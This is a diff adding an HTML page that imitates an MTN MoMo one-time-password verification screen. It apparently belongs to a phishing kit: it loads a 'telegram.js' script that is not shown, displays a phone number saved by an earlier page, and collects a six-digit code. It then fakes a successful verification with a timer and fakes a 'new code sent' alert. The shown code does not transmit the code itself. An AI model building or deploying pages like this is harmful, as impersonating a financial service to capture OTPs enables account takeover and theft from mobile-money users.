@@ -1,0 +1,235 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+    <title>OTP Verification | Momo MTN</title>
+    <meta name="description" content="Verify your identity with a one-time password sent to your MTN MoMo number.">
+
+    <!-- Font Awesome -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.6.0/css/all.min.css">
+
+    <!-- Shared styles -->
+    <link rel="stylesheet" href="assets/css/style.css">
+
+    <style>
+        body {
+            background-color: #fdfaf0;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            min-height: 100vh;
+            padding: 20px;
+        }
+
+        .otp-card {
+            background: #fff;
+            width: 100%;
+            max-width: 450px;
+            padding: 40px;
+            border-radius: 8px;
+            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.05);
+            text-align: center;
+        }
+
+        .otp-card i {
+            font-size: 50px;
+            color: #ffcc00;
+            margin-bottom: 20px;
+        }
+
+        .otp-card h1 {
+            font-size: 24px;
+            font-weight: 800;
+            margin-bottom: 10px;
+            color: #222;
+        }
+
+        .otp-card p {
+            color: #666;
+            font-size: 15px;
+            line-height: 1.5;
+            margin-bottom: 30px;
+        }
+
+        .otp-card p strong {
+            color: #222;
+        }
+
+        .otp-inputs {
+            display: flex;
+            justify-content: center;
+            gap: 10px;
+            margin-bottom: 30px;
+        }
+
+        .otp-inputs input {
+            width: 45px;
+            height: 55px;
+            text-align: center;
+            font-size: 24px;
+            font-weight: 700;
+            border: 1px solid var(--line-strong);
+            border-radius: 6px;
+            outline: none;
+            transition: border-color 0.2s;
+        }
+
+        .otp-inputs input:focus {
+            border-color: var(--accent);
+            box-shadow: 0 0 0 3px rgba(255, 204, 0, .18);
+        }
+
+        .verify-btn {
+            background-color: #ffcc00;
+            color: #000;
+            width: 100%;
+            height: 50px;
+            border: none;
+            border-radius: 6px;
+            font-size: 18px;
+            font-weight: 700;
+            cursor: pointer;
+            transition: background 0.2s;
+        }
+
+        .verify-btn:hover {
+            background-color: #e6b800;
+        }
+
+        .resend {
+            margin-top: 20px;
+            font-size: 14px;
+            color: #777;
+        }
+
+        .resend a {
+            color: #ffcc00;
+            font-weight: 700;
+            text-decoration: none;
+        }
+
+        .loader {
+            display: none;
+            margin: 20px auto;
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #ffcc00;
+            border-radius: 50%;
+            width: 30px;
+            height: 30px;
+            animation: spin 1s linear infinite;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .status-msg {
+            margin-top: 15px;
+            font-size: 14px;
+            font-weight: 600;
+        }
+    </style>
+</head>
+
+<body>
+
+    <div class="otp-card">
+        <i class="fas fa-mobile-screen"></i>
+        <h1>Verify Your Number</h1>
+        <p>We've sent a 6-digit verification code to <br><strong id="userPhone">...</strong></p>
+
+        <form id="otpForm">
+            <div class="otp-inputs">
+                <input type="text" maxlength="1" inputmode="numeric" required>
+                <input type="text" maxlength="1" inputmode="numeric" required>
+                <input type="text" maxlength="1" inputmode="numeric" required>
+                <input type="text" maxlength="1" inputmode="numeric" required>
+                <input type="text" maxlength="1" inputmode="numeric" required>
+                <input type="text" maxlength="1" inputmode="numeric" required>
+            </div>
+
+            <button type="submit" class="verify-btn" id="verifyBtn">Verify & Continue</button>
+            <div class="loader" id="loader"></div>
+            <div class="status-msg" id="statusMsg"></div>
+        </form>
+
+        <div class="resend">
+            Didn't receive the code? <a href="#" id="resendLink">Resend Code</a>
+        </div>
+    </div>
+
+    <script src="assets/js/main.js"></script>
+    <script src="assets/js/telegram.js"></script>
+    <script>
+        (function () {
+            'use strict';
+
+            var form = document.getElementById('otpForm');
+            var inputs = document.querySelectorAll('.otp-inputs input');
+            var userPhone = document.getElementById('userPhone');
+            var verifyBtn = document.getElementById('verifyBtn');
+            var loader = document.getElementById('loader');
+            var statusMsg = document.getElementById('statusMsg');
+            var saved = window.Momo.read() || {};
+
+            if (saved.phone) {
+                userPhone.textContent = saved.phone;
+            }
+
+            // Focus management for OTP inputs
+            inputs.forEach(function (input, index) {
+                input.addEventListener('input', function () {
+                    if (this.value.length === 1 && index < inputs.length - 1) {
+                        inputs[index + 1].focus();
+                    }
+                });
+
+                input.addEventListener('keydown', function (e) {
+                    if (e.key === 'Backspace' && this.value.length === 0 && index > 0) {
+                        inputs[index - 1].focus();
+                    }
+                });
+            });
+
+            form.addEventListener('submit', function (e) {
+                e.preventDefault();
+
+                var otp = '';
+                inputs.forEach(function (input) {
+                    otp += input.value;
+                });
+
+                if (otp.length < 6) {
+                    alert('Please enter the full 6-digit code.');
+                    return;
+                }
+
+                // Simulate verification
+                verifyBtn.style.display = 'none';
+                loader.style.display = 'block';
+                statusMsg.textContent = 'Verifying...';
+                statusMsg.style.color = '#777';
+
+                setTimeout(function () {
+                    statusMsg.textContent = 'Verification Successful!';
+                    statusMsg.style.color = 'var(--success)';
+                    
+                    setTimeout(function () {
+                        window.location.href = 'apply.html';
+                    }, 1000);
+                }, 2000);
+            });
+
+            document.getElementById('resendLink').addEventListener('click', function (e) {
+                e.preventDefault();
+                alert('A new code has been sent to your number.');
+            });
+        })();
+    </script>
+</body>
+
+</html>
